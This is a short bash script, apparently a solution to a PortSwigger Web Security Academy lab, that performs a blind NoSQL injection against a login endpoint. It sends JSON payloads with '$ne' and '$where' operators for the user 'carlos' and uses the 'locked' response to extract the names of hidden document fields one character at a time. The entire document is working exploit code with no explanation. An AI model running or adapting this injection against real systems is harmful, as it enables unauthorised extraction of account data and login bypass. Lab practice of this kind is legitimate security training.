#!/bin/bash
alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
index=01234567890123456789
for (( j=0; j<${#index}; j++ )); do
   # look for a specific field at index j
   for (( i=0; i<${#alphabet}; i++ )); do
      # look for a specific character in the alphabet
      char="${alphabet:$i:1}"
      if [[ $(curl --data "{\"username\":\"carlos\", \"password\":{\"\$ne\":\"z\"}, \"\$where\":\"Object.keys(this)[$1].match('^.{$j}$char.*')\"}" --header "Content-Type: application/json" -s "https://0a92005803f4f92f82fbbaa9002100ca.web-security-academy.net/login" | grep locked) ]]; then
         echo "field[$j] = $char"
         break
      fi
   done
done
